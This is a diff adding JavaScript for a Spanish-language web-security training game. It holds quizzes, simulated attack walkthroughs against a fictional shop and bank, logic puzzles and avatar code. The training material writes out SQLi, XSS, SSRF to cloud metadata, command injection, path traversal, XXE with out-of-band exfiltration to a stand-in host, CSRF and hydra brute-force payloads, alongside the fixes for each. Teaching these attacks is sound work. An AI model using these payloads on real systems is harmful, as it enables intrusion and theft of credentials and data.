+      {q:'Tu factura está en /invoice?id=132. Sospechas que puedes ver las de otros. ¿Qué pruebas?',
+       o:["/invoice?id=132'--","/invoice?id=131","/invoice?admin=true"],c:1,
+       e:'IDOR = el servidor confía en el id que mandas sin comprobar que es tuyo. Cambias 132 por 131 y ves la factura de otro. Sin inyección.'},
+      {q:'La API devuelve TU perfil en /api/users/me. ¿Cómo intentas leer el del usuario con id 2?',
+       o:["/api/users/2","/api/users/me'--","/api/users/me?debug=1"],c:0,
+       e:'Pides /api/users/2 directamente. Si no valida que ese usuario eres tú, te devuelve sus datos.'}
+    ]},
+    'ssrf':{t:'SSRF — que el servidor pida por ti',pasos:[
+      {q:'Un parámetro stockApi=http://... hace que el SERVIDOR pida esa URL. ¿Cómo llegas a un panel interno que tú no puedes abrir?',
+       o:["http://localhost/admin","http://tu-web.com/admin","javascript:admin()"],c:0,
+       e:'El servidor sí puede verse a sí mismo: localhost. Le pides http://localhost/admin y te trae el panel interno. Eso es SSRF.'},
+      {q:'Estás en un servidor en la nube (AWS). ¿Qué URL le haces pedir para robar sus credenciales de metadatos?',
+       o:["http://127.0.0.1:22","http://169.254.169.254/latest/meta-data/","http://aws.amazon.com"],c:1,
+       e:'169.254.169.254 es la IP de metadatos de la nube. Si el servidor la pide por ti, expone claves y roles temporales.'}
+    ]},
+    'cmd-injection':{t:'Command injection — colar tu comando',pasos:[
+      {q:'Un formulario ejecuta  ping TU_ENTRADA. ¿Cómo encadenas tu propio comando para ver el usuario?',
+       o:["' OR 1=1--","; whoami","<script>whoami<\/script>"],c:1,
+       e:'El ; termina el comando ping y ejecuta whoami. El servidor corre ambos. (Según el sistema valen | o &&).'},
+      {q:'El ; está filtrado. ¿Con qué otro separador intentas encadenar el comando?',
+       o:["| whoami","-- whoami","/* whoami */"],c:0,
+       e:'La barra | encadena pasando la salida al siguiente comando, y suele colarse cuando el ; está bloqueado. Se prueban ; | & &&.'}
+    ]},
+    'path-traversal':{t:'Path traversal — salir de la carpeta',pasos:[
+      {q:'Una web sirve imágenes con /loadImage?filename=foto.png. ¿Cómo lees el archivo de contraseñas de Linux?',
+       o:["filename=foto.png'--","filename=../../../../etc/passwd","filename=SELECT * FROM passwd"],c:1,
+       e:'Cada ../ sube una carpeta. Encadenando varios sales del directorio de imágenes hasta la raíz y pides /etc/passwd.'}
+    ]},
+    'autenticacion':{t:'Autenticación — enumerar y forzar',pasos:[
+      {q:'El login dice "contraseña incorrecta" si el usuario existe y "usuario no existe" si no. ¿Qué haces con eso?',
+       o:['fuerza bruta a ciegas','enumerar usuarios: me quedo con los que dan "contraseña incorrecta"','SQLi'],c:1,
+       e:'Esa diferencia en el mensaje te dice qué usuarios existen (enumeración). Es un fallo: los mensajes de login deberían ser idénticos.'},
+      {q:'Ya tienes un usuario válido y el sistema NO limita los intentos. ¿Qué ataque haces a la contraseña?',
+       o:['fuerza bruta / credential stuffing','me rindo','un alert(1)'],c:0,
+       e:'Sin límite de intentos puedes probar miles de contraseñas (fuerza bruta) o listas filtradas (credential stuffing) hasta acertar.'}
+    ]},
+    'csrf':{t:'CSRF — acciones en nombre de la víctima',pasos:[
+      {q:'Quieres que la víctima cambie su email sin querer al visitar tu web. ¿Qué le montas?',
+       o:['un formulario oculto que se autoenvía a /change-email con tu valor','un SQLi en su navegador','un escaneo de puertos'],c:0,
+       e:'CSRF: su navegador envía la petición ya autenticado (con su cookie). Un form oculto que se autoenvía hace la acción sin que se entere.'},
+      {q:'¿Qué defensa rompería tu ataque CSRF?',
+       o:['un token CSRF único por formulario','poner HTTPS','cambiar el color del botón'],c:0,
+       e:'El token CSRF es un valor secreto que tú no conoces; sin él, el servidor rechaza la petición falsificada. Es la defensa principal.'}
+    ]},
+    'xxe':{t:'XXE — entidades externas en XML',pasos:[
+      {q:'La web procesa XML que tú envías. ¿Cómo lees /etc/passwd?',
+       o:["declaro una entidad externa: <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> y la uso","' OR 1=1--","<img src=x onerror=1>"],c:0,
+       e:'XXE: defines una entidad que apunta a un archivo local y la referencias en el XML; el parser la resuelve y te devuelve su contenido.'},
+      {q:'No ves la salida del XML en la respuesta. ¿Qué variante usas?',
+       o:['XXE ciega out-of-band: que el parser llame a tu servidor','UNION SELECT','nada, imposible'],c:0,
+       e:'En XXE ciega haces que el parser se conecte a un servidor tuyo (DNS/HTTP) y te filtre los datos por ahí, sin verlos en la página.'}
+    ]},
+    'sqli-union':{t:'SQLi — UNION: contar columnas',pasos:[
+      {q:'Antes de un ataque UNION necesitas saber cuántas columnas devuelve la consulta. ¿Qué payload las cuenta?',
+       o:["' ORDER BY 1-- , 2-- , 3-- ... hasta que falle","' OR 1=1--","admin'--"],c:0,
+       e:'ORDER BY N ordena por la columna N. Subes N hasta que da error: el último número que funcionó es el número de columnas.'},
+      {q:'Otra forma de averiguar el número de columnas con UNION:',
+       o:["' UNION SELECT NULL-- , NULL,NULL-- ... hasta que no falle","' AND SLEEP(5)--","<script>1<\/script>"],c:0,
+       e:'Vas añadiendo NULLs al UNION SELECT hasta que la consulta deja de dar error: ahí coincide el número de columnas.'}
+    ]},
+    'sqli-blind':{t:'SQLi — blind (a ciegas)',pasos:[
+      {q:'A ciegas no ves el resultado, pero aparece "Welcome back" si la consulta devuelve fila. ¿Cómo sacas la contraseña letra a letra?',
+       o:["' AND SUBSTRING(password,1,1)='a  (pruebo a,b,c...)","' UNION SELECT password--","alert(document.cookie)"],c:0,
+       e:'Preguntas sí/no por cada carácter: si aciertas la letra aparece "Welcome back". Repites por cada posición y reconstruyes la clave.'},
+      {q:'No hay ni texto ni error observable. ¿Qué técnica a ciegas usas?',
+       o:["por tiempo: ' AND IF(condición, SLEEP(5), 0)-- y mido el retardo","ORDER BY 1--","un <img>"],c:0,
+       e:'Si la condición es cierta, fuerzas un retardo (SLEEP) y la respuesta tarda más. Mides el tiempo para deducir cada bit del dato.'}
+    ]}
+  };
+
+  // ---- Banco de 10 mini-puzzles de ingenio (uno aleatorio por partida) ----
+  var PUZZLES=[
+    {jar:true,q:'Hay una bola de corcho en el fondo del frasco y no llegas con la mano. Sácala… pensando distinto.',
+     acts:[{t:'✋ Meter la mano',ok:false,m:'El cuello es muy estrecho: no llegas. La fuerza bruta no sirve.'},
+           {t:'💧 Echar agua en el frasco',ok:true,m:''},
+           {t:'🧲 Usar un imán',ok:false,m:'La bola es de corcho, no es metal. El imán no hace nada.'},
+           {t:'🙃 Volcar el frasco',ok:false,m:'Está pegado a la mesa (trampa del reto). No se mueve.'}],
+     e:'El agua sube y empuja la bola (flotabilidad: el corcho es menos denso que el agua). No rompes nada: buscas el camino que nadie mira. Así piensa un hacker.'},
+    {scene:'⛵🪜🌊',q:'Un barco con una escalera: el agua cubre el 3er peldaño y la marea sube 20 cm/h. Los peldaños están cada 20 cm. ¿Cuántos cubrirá en 2 horas?',
+     acts:[{t:'2 peldaños más',ok:false,m:'Esa es la trampa: suena lógico, pero no.'},
+           {t:'Ninguno: el barco flota y sube con la marea',ok:true,m:''},
+           {t:'4 peldaños',ok:false,m:'No, el barco no se queda quieto.'}],
+     e:'El barco flota: sube con el agua, así que el mismo peldaño sigue en la superficie. Cuidado con los datos que te meten para despistar.'},
+    {scene:'🕯️🕯️⏱️',q:'Dos cuerdas tardan 1 h en quemarse cada una (pero arden irregular). ¿Cómo mides 45 minutos exactos?',
+     acts:[{t:'Quemar una entera y media de la otra',ok:false,m:'No puedes fiarte de "la mitad": arden irregular.'},
+           {t:'Enciende la 1ª por los 2 extremos y la 2ª por uno; al acabar la 1ª (30 min) enciende el otro extremo de la 2ª',ok:true,m:''},
+           {t:'Cortar una por la mitad',ok:false,m:'La longitud no equivale a tiempo: arde irregular.'}],
+     e:'La 1ª por 2 extremos tarda 30 min. En ese momento a la 2ª le queda 30 min por un extremo; al encender el otro, se queman en 15. 30+15 = 45. Ingenio puro.'},
+    {scene:'🥚❓',q:'Tienes un huevo y no sabes si está crudo o cocido. ¿Cómo lo averiguas sin romperlo?',
+     acts:[{t:'Pesarlo',ok:false,m:'Pesan casi igual.'},
+           {t:'Hacerlo girar: el cocido gira rápido, el crudo se tambalea',ok:true,m:''},
+           {t:'Olerlo',ok:false,m:'Por fuera huele igual.'}],
+     e:'El cocido es sólido y gira limpio; en el crudo el líquido de dentro se mueve y lo frena (inercia). Física aplicada a un truco cotidiano.'},
+    {scene:'🏢🛗',q:'Un hombre vive en el 10º. Baja siempre en ascensor, pero al subir va al 7º y sube andando… salvo si llueve. ¿Por qué?',
+     acts:[{t:'Le gusta hacer ejercicio',ok:false,m:'¿Y por qué cambia cuando llueve?'},
+           {t:'Es bajito: solo alcanza el botón 7; con paraguas (lluvia) llega al 10',ok:true,m:''},
+           {t:'El ascensor se avería arriba',ok:false,m:'No, funciona bien.'}],
+     e:'Detalle que lo explica todo: su altura. El paraguas los días de lluvia le da el alcance extra. Observa los detalles que parecen irrelevantes.'},
+    {scene:'🧊🥛',q:'Un vaso lleno hasta el borde con agua y un cubito de hielo flotando. Cuando se derrita, ¿se desborda?',
+     acts:[{t:'Sí, se sale el agua',ok:false,m:'Parece lógico, pero no.'},
+           {t:'No: el nivel queda igual',ok:true,m:''},
+           {t:'Baja el nivel',ok:false,m:'Tampoco.'}],
+     e:'El hielo ya desplaza (flotando) justo el agua que ocupará al derretirse. El nivel no cambia. Principio de Arquímedes.'},
+    {scene:'🦒🧊📦',q:'Clásico lateral: ¿cómo metes una jirafa en una nevera?',
+     acts:[{t:'La cortas en trozos',ok:false,m:'Innecesariamente brutal 😅'},
+           {t:'Abres la nevera, la metes y la cierras',ok:true,m:''},
+           {t:'Imposible, no cabe',ok:false,m:'No te rindas tan rápido.'}],
+     e:'A veces la solución es la simple y directa, sin complicarla. (El siguiente sería: ¿cómo metes un elefante? Primero sacas la jirafa 😉).'},
+    {scene:'⚖️🪙',q:'9 monedas iguales; una pesa un poco más. Con una balanza de platillos, ¿mínimo de pesadas para encontrarla seguro?',
+     acts:[{t:'3 pesadas',ok:false,m:'Se puede en menos.'},
+           {t:'2 pesadas (grupos de 3)',ok:true,m:''},
+           {t:'4 pesadas',ok:false,m:'Demasiadas.'}],
+     e:'Divides en 3 grupos de 3 y pesas dos: sabes en qué grupo está. Luego pesas 2 monedas de ese grupo. 2 pesadas. Dividir para vencer.'},
+    {scene:'🚪🚪🧍🧍',q:'Dos puertas (una buena) y dos guardias: uno siempre miente, otro siempre dice la verdad, no sabes quién es quién. Solo UNA pregunta. ¿Cuál?',
+     acts:[{t:'"¿Cuál es la puerta buena?"',ok:false,m:'No distingues quién miente.'},
+           {t:'"¿Qué puerta diría el OTRO guardia que es la buena?" → eliges la contraria',ok:true,m:''},
+           {t:'"¿Tú mientes?"',ok:false,m:'Los dos dirían "no".'}],
+     e:'Preguntes a quien preguntes, esa respuesta señala la puerta MALA (una mentira envuelve una verdad o al revés). Eliges la otra. Lógica pura.'},
+    {scene:'🕯️🔥🏠',q:'Entras en una cabaña oscura y fría. Tienes una cerilla, y dentro hay una vela, un quinqué y una chimenea. ¿Qué enciendes primero?',
+     acts:[{t:'La vela',ok:false,m:'Primero necesitas fuego.'},
+           {t:'La cerilla',ok:true,m:''},
+           {t:'La chimenea',ok:false,m:'¿Con qué, sin llama aún?'}],
+     e:'Sin encender la cerilla no puedes encender nada más. La respuesta estaba en tu mano: lee bien antes de lanzarte. Igual que en un pentest.'}
+  ];
+
+  // ---- Cinemática de explotación por tema (atacante vs víctima) ----
+  var HACKS={
+    'sqli-basico':{victim:'ACME Shop',url:'acme-shop.net/filter?category=Gifts',steps:[
+      {c:'GET /filter?category=Gifts',o:'200 OK',s:'<b>Categoría: Gifts</b><div class="pr">🎁 Mug · 💳 Gift Card</div><div class="muted">(solo productos publicados)</div>'},
+      {c:"GET /filter?category=Gifts'--",o:'200 OK  (el filtro AND released=1 se comenta)',s:'<b>Categoría: Gifts</b><div class="pr">🎁 Mug · 💳 Gift Card · <mark>🕵️ Unreleased 2026</mark> · <mark>🔒 Staff-only</mark></div><div class="danger">¡Productos ocultos expuestos!</div>'},
+      {c:"POST /login  user=administrator'--  pass=(vacío)",o:'302 Found → /admin',s:'<b>login.php</b><div class="ok">✅ Sesión iniciada: administrator</div><div class="pr">Panel de administración 🛠️</div>'}
+    ]},
+    'xss-basico':{victim:'Blog de la tienda',url:'blog.acme.net/post?id=3#comentarios',steps:[
+      {c:'POST /comment  body=<script>alert(1)<\/script>',o:'200 OK (comentario guardado)',s:'<b>Comentarios</b><div class="pr">💬 "Gran producto!" — Ana</div><div class="pr">💬 [tu comentario] — se carga el script…</div>',a:'1'},
+      {c:'POST /comment  body=<img src=x onerror=alert(document.domain)>',o:'200 OK',s:'<b>Comentarios</b><div class="pr">💬 La imagen falla → onerror ejecuta JS</div><div class="danger">XSS almacenado: salta a cada visitante.</div>',a:'blog.acme.net'}
+    ]},
+    'idor':{victim:'Banca online',url:'bank.acme.net/invoice?id=132',steps:[
+      {c:'GET /invoice?id=132   (Cookie: session=TU)',o:'200 OK',s:'<b>Factura #132</b><div class="pr">Titular: TÚ · Total: 48,20 €</div>'},
+      {c:'GET /invoice?id=131',o:'200 OK  ← no comprueba de quién es',s:'<b>Factura #131</b><div class="pr">Titular: María G. · IBAN ****8821 · 310,00 €</div><div class="danger">Datos de OTRO usuario expuestos (IDOR).</div>'}
+    ]},
+    'ssrf':{victim:'Servidor de la tienda',url:'acme.net/product/stock  (stockApi=…)',steps:[
+      {c:'POST /product/stock  stockApi=http://localhost/admin',o:'200 OK',s:'<b>Respuesta del servidor</b><div class="term2">&lt;h1&gt;Panel interno&lt;/h1&gt; Usuarios: 1.204 · Borrar BD · Config</div><div class="danger">El servidor pidió su propio /admin interno.</div>'},
+      {c:'stockApi=http://169.254.169.254/latest/meta-data/iam/security-credentials/',o:'200 OK',s:'<b>Metadatos AWS</b><div class="term2">{ "AccessKeyId":"AKIA...", "SecretAccessKey":"wJalr...", "Token":"FQoG..." }</div><div class="danger">Credenciales de la nube robadas.</div>'}
+    ]},
+    'cmd-injection':{victim:'Herramienta de red',url:'acme.net/ping',steps:[
+      {c:'ping=127.0.0.1; whoami',o:'',s:'<b>Salida del servidor</b><div class="term2">PING 127.0.0.1: 64 bytes, time=0.04ms\nwww-data</div><div class="danger">Se ejecutó TU comando (whoami) en el servidor.</div>'},
+      {c:'ping=127.0.0.1 | id',o:'',s:'<b>Salida del servidor</b><div class="term2">uid=33(www-data) gid=33(www-data) groups=33</div><div class="danger">El separador | también cuela el comando.</div>'}
+    ]},
+    'path-traversal':{victim:'Servidor de imágenes',url:'acme.net/loadImage?filename=foto.png',steps:[
+      {c:'GET /loadImage?filename=../../../../etc/passwd',o:'200 OK',s:'<b>Respuesta</b><div class="term2">root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n...</div><div class="danger">Leíste un archivo del sistema saliendo de la carpeta.</div>'}
+    ]},
+    'autenticacion':{victim:'Login de la app',url:'acme.net/login',steps:[
+      {c:'POST /login  (probando usuarios) → leer el mensaje',o:'',s:'<b>Respuestas del login</b><div class="pr">bob → "usuario no existe"</div><div class="pr"><mark>carlos → "contraseña incorrecta"</mark></div><div class="pr"><mark>admin → "contraseña incorrecta"</mark></div><div class="ok">Usuarios válidos encontrados (enumeración).</div>'},
+      {c:'hydra -l admin -P rockyou.txt   (sin límite de intentos)',o:'[80][http-post-form] login: admin  password: Winter2026!',s:'<b>Login</b><div class="ok">✅ Acceso: admin / Winter2026!</div><div class="danger">Fuerza bruta: no había límite de intentos.</div>'}
+    ]},
+    'csrf':{victim:'Banca de la víctima',url:'evil-site.net  →  bank.acme.net/change-email',steps:[
+      {c:'[Juan aloja una página trampa con un formulario oculto]',o:'servida en evil-site.net',s:'<b>evil-site.net</b><div class="pr">🐱 "Vídeos de gatos"</div><div class="muted">&lt;form action="bank.acme.net/change-email" … autosubmit&gt;</div>'},
+      {c:'[la víctima, ya logueada en su banco, visita evil-site.net]',o:'POST /change-email → 200 OK',s:'<b>bank.acme.net · Perfil</b><div class="pr">Email de la cuenta: <b>attacker@evil.net</b></div><div class="danger">Cambiado sin que la víctima lo quisiera (CSRF).</div>'}
+    ]},
+    'xxe':{victim:'API que procesa XML',url:'acme.net/upload (Content-Type: application/xml)',steps:[
+      {c:'POST /upload  <!ENTITY xxe SYSTEM "file:///etc/passwd"> …&xxe;',o:'200 OK',s:'<b>Respuesta XML</b><div class="term2">&lt;result&gt;root:x:0:0:root:/root:/bin/bash daemon:x:1:1:...&lt;/result&gt;</div><div class="danger">La entidad externa leyó /etc/passwd.</div>'},
+      {c:'XXE ciega → entidad que llama a http://juan-oob.net',o:'inbound en el servidor de Juan',s:'<b>Servidor de Juan (OOB)</b><div class="term2">[collaborator] víctima conectó: ?data=cm9vdDp4OjA6MA==</div><div class="danger">Exfiltración a ciegas por fuera (out-of-band).</div>'}
+    ]},
+    'sqli-union':{victim:'Buscador de la tienda',url:'acme.net/filter?category=Gifts',steps:[
+      {c:"?category=Gifts' ORDER BY 3--",o:'500 Internal Server Error',s:'<b>Error SQL</b><div class="term2">ORDER BY position 3 is out of range</div><div class="ok">→ la consulta tiene 2 columnas.</div>'},
+      {c:"?category=Gifts' UNION SELECT username,password FROM users--",o:'200 OK',s:'<b>Resultados</b><div class="term2">administrator | 2$b7f...e1\ncarlos        | 9f1...aa</div><div class="danger">Volcado de usuarios y contraseñas.</div>'}
+    ]},
+    'sqli-blind':{victim:'Web con cookie de tracking',url:'acme.net/   (Cookie: TrackingId=…)',steps:[
+      {c:"TrackingId=xyz' AND SUBSTRING(password,1,1)='s",o:'200 OK',s:'<b>Página</b><div class="ok">“Welcome back” ✔ → la 1ª letra ES "s"</div><div class="pr">reconstruyendo: s _ _ _ _ _ …</div>'},
+      {c:"TrackingId=xyz' AND IF(SUBSTRING(pw,2,1)='3',SLEEP(3),0)--",o:'respuesta en 3.01 s (retardo)',s:'<b>Medición de tiempo</b><div class="term2">normal: 0.04s  |  con SLEEP: 3.01s  ← condición cierta</div><div class="pr">password: s 3 c r e t …</div>'}
+    ]}
+  };
+
+  function esc(s){ return (s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function gfmt(s){ var m=Math.floor(s/60),ss=s%60; return (m<10?'0':'')+m+':'+(ss<10?'0':'')+ss; }
+  var gov=document.getElementById('gameOverlay'), gcard=document.getElementById('gameCard'), gS=null, gTypeTimer=null;
+
+  // ---------- Cosméticos / desbloqueos ----------
+  var CATALOG={
+    cap:[['red','Gorra roja'],['gold','Gorra dorada'],['cyber','Gorra cíber'],['purple','Gorra púrpura']],
+    glasses:[['green','Ojos verdes'],['shades','Gafas de sol'],['cyber','Visor cíber'],['vr','Gafas VR']],
+    acc:[['none','Sin extra'],['headphones','Cascos'],['crown','Corona'],['antenna','Antena']],
+    bg:[['synth','Portal synthwave'],['matrix','Portal Matrix'],['neon','Portal neón'],['void','Portal void']],
+    anim:[['float','Flotar'],['spin','Girar'],['pulse','Pulso neón'],['glitch','⚡ Glitch'],['rainbow','🌈 Arcoíris']]
+  };
+  var DEFAULT_COS={cap:'red',glasses:'green',acc:'none',bg:'synth',anim:'float'};
+  var DEFAULT_UNLOCKED=['cap:red','glasses:green','acc:none','bg:synth','anim:float'];
+  var REWARDS=['glasses:shades','cap:gold','acc:headphones','bg:matrix','anim:spin','glasses:cyber','cap:cyber','acc:crown','bg:neon','anim:pulse','glasses:vr','cap:purple','acc:antenna','bg:void'];
+  var EQUIP=loadCos(), UNLOCKED=loadUnlocked();
+  function loadCos(){ var c; try{c=JSON.parse(localStorage.getItem('game-cos-v1'));}catch(e){} c=c||{}; var o={}; for(var k in DEFAULT_COS){o[k]=c[k]||DEFAULT_COS[k];} return o; }
+  function saveCos(){ try{localStorage.setItem('game-cos-v1',JSON.stringify(EQUIP));}catch(e){} }
+  function loadUnlocked(){ var a; try{a=JSON.parse(localStorage.getItem('game-unlocks-v1'));}catch(e){} if(!a||!a.length) a=DEFAULT_UNLOCKED.slice(); DEFAULT_UNLOCKED.forEach(function(id){if(a.indexOf(id)<0)a.push(id);}); return a; }
+  function saveUnlocked(){ try{localStorage.setItem('game-unlocks-v1',JSON.stringify(UNLOCKED));}catch(e){} }
+  function isUnlocked(cat,val){ return UNLOCKED.indexOf(cat+':'+val)>=0; }
+  var PREMIUM_ITEMS={'anim:glitch':1,'anim:rainbow':1};
+  function isPremium(){ try{return localStorage.getItem('mapa-premium-ok')==='1';}catch(e){return false;} }
+  function labelFor(id){ var p=id.split(':'),cat=p[0],val=p[1],list=CATALOG[cat]||[]; for(var i=0;i<list.length;i++){if(list[i][0]===val)return list[i][1];} return val; }
+  function unlockNext(){ for(var i=0;i<REWARDS.length;i++){ if(UNLOCKED.indexOf(REWARDS[i])<0){ UNLOCKED.push(REWARDS[i]); saveUnlocked(); var p=REWARDS[i].split(':'); EQUIP[p[0]]=p[1]; saveCos(); return {id:REWARDS[i],cat:p[0],val:p[1],label:labelFor(REWARDS[i])}; } } return null; }
+
+  // ---------- Sprite pixel-art configurable ----------
+  function avatar(px,cos){
+    px=px||6; cos=cos||EQUIP;
+    var caps={red:['#e23b4e','#a7222f'],gold:['#ffcf3f','#c99a1a'],cyber:['#36e6ff','#128fb0'],purple:['#b06bff','#7a3fd0']};
+    var cc=caps[cos.cap]||caps.red;
+    var col={s:'#f2c79a',h:'#2b3752',H:'#1b2338',g:'#5ef08a',k:'#eab98a',o:'#141a2b',x:'#07121a',q:'#36e6ff',y:'#ffd84a',w:'#ffffff',p:'#b06bff',c:cc[0],C:cc[1]};
+    var base=[
+      '..............',
+      '.....cccc.....',
+      '...cccccccc...',
+      '..cccccccccc..',
+      '..CCCCCCCCCCCC',
+      '...hssssssh...',
+      '...hEEEEEEh...',
+      '...hssssssh...',
+      '..HhhhhhhhhH..',
+      '..HhhggghhhH..',
+      '..HhhhhhhhhH..',
+      '.kHhhhhhhhHk.',
+      '..HhhhhhhhhH..',
+      '...hh....hh...',
+      '...oo....oo...'
+    ];
+    var W=14, grid=base.map(function(r){ r=(r+'..............').slice(0,W); return r.split(''); });
+    // ojos / gafas (fila 6, columnas 4..9)
+    var eyeRow=6, e0=4, e6=['.','.','.','.','.','.'];
+    if(cos.glasses==='shades'){ e6=['x','w','x','x','x','x']; }
+    else if(cos.glasses==='cyber'){ e6=['q','q','q','q','q','q']; }
+    else if(cos.glasses==='vr'){ e6=['x','q','q','x','q','q']; }
+    else { e6=['s','g','s','s','g','s']; } // verdes
+    for(var i=0;i<6;i++){ grid[eyeRow][e0+i]=e6[i]; }
+    // accesorio
+    if(cos.acc==='headphones'){ [5,6,7].forEach(function(r){ grid[r][2]='o'; grid[r][11]='o'; }); }
+    else if(cos.acc==='crown'){ [4,6,8,10].forEach(function(cx){ grid[0][cx]='y'; }); grid[0][7]='y'; }
+    else if(cos.acc==='antenna'){ grid[0][7]='o'; grid[0][8]='q'; }
+    var H=grid.length, svg='<svg class="g-ava '+(cos.anim||'float')+'" width="'+(W*px)+'" height="'+(H*px)+'" viewBox="0 0 '+W+' '+H+'" shape-rendering="crispEdges" xmlns="http://www.w3.org/2000/svg">';
+    for(var y=0;y<H;y++){ for(var x=0;x<W;x++){ var ch=grid[y][x]; if(ch&&ch!=='.'&&col[ch]) svg+='<rect x="'+x+'" y="'+y+'" width="1" height="1" fill="'+col[ch]+'"/>'; } }
+    return svg+'</svg>';
+  }
+  function wrap(inner){ return '<div class="g-wrap bg-'+(EQUIP.bg||'synth')+'"><div class="g-grid-bg"></div><div class="g-scan"></div>'+inner+'</div>'; }
+
+  // ---------- Ciclo del juego ----------
+  // ---------- Perfil adaptativo + anti-repetición (no azar que repite) ----------
+  function getProfile(){ try{return localStorage.getItem('game-profile');}catch(e){return null;} }
+  function setProfile(v){ try{localStorage.setItem('game-profile',v);}catch(e){} }
+  function profileLabel(){ var p=getProfile(); return p==='juego'?'🎮 Práctico':p==='teoria'?'📖 Teórico':p==='ambos'?'⚖️ Mixto':'sin definir'; }
+  function bump(k){ try{ localStorage.setItem(k,(+(localStorage.getItem(k)||0))+1); }catch(e){} }
+  function getNum(k){ try{ return +(localStorage.getItem(k)||0); }catch(e){ return 0; } }
+  var gLast={};
+  // Índice NO repetido por pool: recuerda lo visto y evita el último; si todo visto, reinicia.
+  function pickNoRepeat(pool,total){
+    var k='game-seen-'+pool, seen=[],i, last=gLast[pool];
+    try{ seen=JSON.parse(localStorage.getItem(k))||[]; }catch(e){}
+    if(seen.length>=total) seen=[];
+    var cand=[]; for(i=0;i<total;i++){ if(seen.indexOf(i)<0 && i!==last) cand.push(i); }
+    if(!cand.length){ for(i=0;i<total;i++){ if(i!==last) cand.push(i); } }
+    if(!cand.length) cand=[0];
+    var pick=cand[Math.floor(Math.random()*cand.length)];
+    seen.push(pick); try{ localStorage.setItem(k,JSON.stringify(seen)); }catch(e){}
+    gLast[pool]=pick; return pick;
+  }
+  // Firma reciente (anillo): si un reto ya salió hace poco, se cambia por otro.
+  function rememberRecent(k,sig,max){ var a=[]; try{a=JSON.parse(localStorage.getItem('game-recent-'+k))||[];}catch(e){} a.push(sig); if(a.length>max) a=a.slice(a.length-max); try{localStorage.setItem('game-recent-'+k,JSON.stringify(a));}catch(e){} }
+  function seenRecent(k,sig){ var a=[]; try{a=JSON.parse(localStorage.getItem('game-recent-'+k))||[];}catch(e){} return a.indexOf(sig)>=0; }
+
+  var THEORY={
+    'sqli-basico':{que:'La web mete tu texto dentro de una consulta SQL sin separarlo del código, así que puedes inyectar SQL.',detectar:"Escribe una comilla ' y mira si cambia la respuesta o da error.",clave:"Gifts'--   ·   ' OR 1=1--   ·   administrator'--",fix:'Consultas parametrizadas (prepared statements): el dato nunca se ejecuta como código SQL.'},
+    'xss-basico':{que:'La web refleja tu entrada en el HTML sin limpiarla, así que tu JavaScript se ejecuta en el navegador de la víctima.',detectar:'Inyecta <b>texto</b> o <script> y mira si se ejecuta en vez de mostrarse.',clave:'<script>alert(1)<\/script>  ·  <img src=x onerror=alert(1)>',fix:'Codificar la salida (escapar < > ") y usar Content-Security-Policy (CSP).'},
+    'idor':{que:'El servidor usa un identificador que mandas tú (id en la URL) sin comprobar que te pertenece.',detectar:'Cambia el id (132→131) y mira si ves datos de otro usuario.',clave:'/invoice?id=131   ·   /api/users/2',fix:'Comprobar en el servidor que el recurso pertenece al usuario autenticado.'},
+    'ssrf':{que:'Consigues que el SERVIDOR haga peticiones por ti a destinos internos que tú no alcanzas.',detectar:'Un parámetro que recibe una URL y el servidor la pide.',clave:'http://localhost/admin   ·   http://169.254.169.254/latest/meta-data/',fix:'Lista blanca de destinos, bloquear IPs internas y de metadatos, no seguir redirecciones.'},
+    'cmd-injection':{que:'La web mete tu entrada en un comando del sistema operativo; tú encadenas el tuyo.',detectar:'Prueba  ;  |  &  con un comando inofensivo como whoami.',clave:'; whoami   ·   | id',fix:'No llamar a la shell; usar APIs seguras y validar/escapar la entrada.'},
+    'path-traversal':{que:'Un parámetro con nombre de archivo te deja salir de la carpeta prevista usando ../',detectar:'filename=../../etc/passwd y mira si lo lee.',clave:'../../../../etc/passwd',fix:'Normalizar la ruta, lista blanca de ficheros, no concatenar la entrada a rutas.'},
+    'autenticacion':{que:'Fallos en el login: mensajes que delatan qué usuarios existen, sin límite de intentos, sesiones débiles.',detectar:'Compara "usuario no existe" vs "contraseña incorrecta".',clave:'enumeración de usuarios + fuerza bruta / credential stuffing',fix:'Mensajes genéricos, límite de intentos, 2FA y bloqueo progresivo.'},
+    'csrf':{que:'Haces que el navegador de la víctima, ya logueado, envíe una acción sin que ella quiera.',detectar:'Acciones sensibles (cambiar email) sin token anti-CSRF.',clave:'formulario oculto que se autoenvía a /change-email',fix:'Token CSRF único por formulario y cookies SameSite.'},
+    'xxe':{que:'Un parser de XML procesa entidades externas que defines tú, y lee archivos o conecta hacia fuera.',detectar:'La web acepta XML; prueba una entidad SYSTEM.',clave:'<!ENTITY xxe SYSTEM "file:///etc/passwd">',fix:'Desactivar entidades externas y DTD en el parser XML.'},
+    'sqli-union':{que:'Con UNION añades tu propia consulta y recuperas datos de otras tablas.',detectar:'Primero cuenta columnas (ORDER BY o UNION SELECT NULL).',clave:"' ORDER BY N--   ·   ' UNION SELECT user,pass FROM users--",fix:'Igual que SQLi: consultas parametrizadas y mínimos privilegios en la BD.'},
+    'sqli-blind':{que:'No ves el resultado, pero un cambio (texto, error o retardo) responde sí/no por cada carácter.',detectar:'Busca un "semáforo": un "Welcome back", un error 500 o un retardo.',clave:"SUBSTRING(password,1,1)='a'   ·   IF(cond, SLEEP(5), 0)",fix:'Consultas parametrizadas y no exponer diferencias observables.'}
+  };
+
+  function profileScreen(){
+    clearTimers();
+    var tip=''; if(getNum('game-skips')>=3) tip='<div class="wr-count">💡 Veo que saltas los puzzles: quizá te encaje <b>📖 Con teoría</b>.</div>';
+    gcard.innerHTML=wrap(
+      '<div class="g-neon"><span class="b" style="font-size:1.4rem">¿CÓMO APRENDES MEJOR?</span></div>'+
+      '<div class="g-char-row">'+avatar(6)+'<span class="g-name">👾 HackerXd</span></div>'+
+      '<div class="g-say"><b class="name">HackerXd</b>: adapto el juego a ti. Puedes cambiarlo cuando quieras.</div>'+tip+
+      '<div class="g-screen"><div class="g-acts" id="gProf"></div></div>');
+    var opts=[['juego','🎮 Jugando','mini-juegos y retos, poca teoría'],
+      ['teoria','📖 Con teoría','explicación del tema + comprobación'],
+      ['ambos','⚖️ Las dos','teoría breve + juego completo']];
+    var box=document.getElementById('gProf');
